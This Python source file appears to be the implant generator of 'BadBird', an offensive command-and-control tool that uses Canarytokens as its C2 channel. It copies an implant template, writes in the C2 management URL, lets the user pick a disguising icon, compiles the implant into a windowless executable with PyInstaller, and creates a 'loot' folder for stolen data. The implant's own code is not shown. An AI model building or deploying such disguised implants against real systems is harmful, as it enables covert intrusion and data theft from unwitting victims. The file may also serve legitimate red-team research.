# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com

import fileinput
import itertools
import os
import shutil
import sys
import threading
import time

import PyInstaller.__main__
from colorama import Fore

def animate():
    for c in itertools.cycle([Fore.BLUE+'[|]'+Fore.RESET+' Creating Exe   ',Fore.BLUE+ '[/]'+Fore.RESET+' Creating Exe.  ',Fore.BLUE+ '[-]'+Fore.RESET+' Creating Exe.. ',Fore.BLUE+ '[\\]'+Fore.RESET+' Creating Exe...']):
        if done:
            break
        sys.stdout.write('\r' +c)
        sys.stdout.flush()
        time.sleep(0.25)

def generateimplant(canaryManagementURL):
    global done
    done = False
    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating implant payload...")

    implantType = str(input(Fore.BLUE + "[!]" + Fore.RESET + " Type of payload (`exe` or `py`): ")).lower().strip()

    if ((implantType != "exe") and (implantType != "py")):
        print(Fore.RED + "\n[-]" + Fore.RESET + "Invalid entry, enter either `exe` or `py`.")
        print(implantType)
        generateimplant()

    if (implantType == "exe"):
        # Check what OS we are running on

        # more icons can be added to the /icon folder
        icons = os.listdir("resources/icons/")
        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Available .ico files in:")
        middle = int((len(icons) / 2))
        for count, icon in enumerate(icons):
            print(icon, end=" ")
            if count == middle:
                print("")

        while True:
            iconFile = str(input(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Icon file for the exe (choose one of the above): "))

            if iconFile in icons:
                break
            if iconFile == "":
                iconFile = "defaultexe.ico"
                print(Fore.BLUE + "[!]" + Fore.RESET + " Using default icon file: " + iconFile + "\n")
                break

            else:
                print(Fore.RED + "\n[-]" + Fore.RESET + " Invalid entry")

    # Logic loop to ensure valid name
    while True:
        name = str(input(Fore.BLUE + "[!]" + Fore.RESET + " Name for implant (exclude the extension): "))
        if ((name == "") or ("\\" in name) or ("/" in name)) or ("." in name) or (" " in name) or (os.path.exists("payloads/" + name + "/")):
            print(Fore.RED + "\n[-]" + Fore.RESET + " Name cannot be empty or include forward/backslashes and name must be unique in /payloads folder.")

        else:
            break


    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Editing payload template with new token...")

    try:
        # copy template to new file
        os.mkdir("payloads/" + name)

        # make and set loot directory
        os.mkdir("loot/" + name)
        lootpath = "loot/" + name + "/"

        shutil.copyfile("implant.py", "payloads/" + name + "/" + name + "_implant.py")

        with fileinput.FileInput("payloads/" + name + "/" + name + "_implant.py", inplace=True) as file:
            for line in file:
                sys.stdout.write(
                    line.replace('canaryManagementURL = \"\"', 'canaryManagementURL = \"' + canaryManagementURL + '\"'))

        fileinput.close()
        print(Fore.BLUE + "[!]" + Fore.RESET + " Payload template successfully edited with new token...")


    except Exception as e:
        print(e)
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)

    implantdir = (f'payloads/{name}/')

    # if exe chosen, compile with pyinstaller
    if implantType == "exe":
        print(Fore.BLUE + "[!]" + Fore.RESET + " Compiling payload with pyinstaller. Please wait...\n")
        shutil.copyfile("resources/icons/" + iconFile, "payloads/" + name + "/" + iconFile)

        # cool animation time
        t = threading.Thread(target=animate)
        t.daemon = True
        t.start()

        try:
            PyInstaller.__main__.run([
                '--name=%s' % name,
                '--onefile',
                '--clean',
                '--icon=%s' % iconFile,
                '--workpath=%s' % implantdir,
                '--specpath=%s' % implantdir,
                '--distpath=%s' % implantdir,
                '--noconsole',
                '--windowed',
                '--log-level=%s' % "CRITICAL",
                "payloads/" + name + "/" + name + "_implant.py",
            ])

            done = True

            # clean up
            os.remove("payloads/" + name + "/" + name + "_implant.py")
            os.remove("payloads/" + name + "/" + name + ".spec")
            os.remove("payloads/" + name + "/" + iconFile)

            print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Created implant located at " + implantdir + name + ".exe!\n")
            return lootpath

        except Exception as e:
            print(e)
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            done = True
            return

    else:
        print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Created implant located at " + implantdir + name + ".py!\n")
        return lootpath
